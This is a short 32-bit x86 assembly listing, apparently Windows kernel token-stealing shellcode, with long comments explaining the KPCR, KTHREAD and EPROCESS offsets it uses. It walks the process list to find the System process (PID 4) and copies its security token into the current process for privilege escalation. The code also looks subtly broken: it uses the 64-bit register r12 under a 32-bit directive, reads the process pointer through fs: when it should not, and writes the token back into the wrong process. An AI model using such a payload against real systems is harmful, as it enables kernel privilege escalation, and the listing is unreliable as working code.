[BITS 32]

_start :
  ;the KPRC (Kernel Processor Control Region) structure. The KPCR contains per-CPU information which is shared by the kernel and the HAL (Hardware Abstraction Layer). 
  ;This stores critical information about CPU state and information. This is located at the base address of the FS segment register at index 0 in 32-bit Windows systems, 
  ;it’s [FS:0] and on 64-bit systems, it’s located in the GS segment register, [GS:0].
  ;We can see at offset 0x120 it points to ‘PrcData’ which is of type KPRCB (Kernel Processor Control Block) structure. 
  ;This structure contains information about the processor such as current running thread, next thread to run, type, model, speed, etc. Both these structures are undocumented.

  pushad ; Save processsor state 
  xor eax , eax
  mov eax , fs:[eax+0x124] ;  move the _KPCR.PcrbData.CurrentThread into eax
  
  ;PrcData’ _KPRCB structure we can find at offset 0x4 ‘CurrentThread’ which is of _KTHREAD (Kernel Thread) structure. This structure is embedded inside the ETHREAD structure.
  ;The ETHREAD structure is used by the Windows kernel to represent every thread in the system. This is represented by [FS:0x124].
  
  ;Next _KTHREAD.ApcState.Process is fetched into EAX. Let’s explore the _KTHREAD structure. At offset 0x40 we can find ‘ApcState’ which is of _KAPC_STATE. 
  ;The KAPC_STATE is used to save the list of APCs (Asynchronous Procedure Calls) queued to a thread when the thread attaches to another process.
  
  ;If explore further more on _KAPC_STATE structure we can find a pointer to the current process structure at offset 0x10, ‘Process’ which is of _KPROCESS structure. 
  ;The KPROCESS structure is embedded inside the EPROCESS structure and it contains scheduling related information like threads, quantum, priority and execution times. This is done in the shellcode as
  
  mov eax , fs:[eax+0x50]
  mov ecx , eax
  ; find system process steal token 
  
  blah:
  ; traverse the double linked list and find the process ID of 0x4.
    mov eax, [eax + 0x0B8] ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
    sub eax, 0x0B8
    cmp [eax + 0x0B4], 0x4 ; Get nt!_EPROCESS.UniqueProcessId
    jne blah

  ;Once we find the ‘System’ process we replace our current process’s token with the token value of the ‘System’ process. The offset of ‘Token’ is at 0xf8
  mov eax, [eax + 0x0F8] ; Get SYSTEM process nt!_EPROCESS.Token  
  mov [eax + 0x0F8], r12 ; Replace our current token to SYSTEM
  popad
   
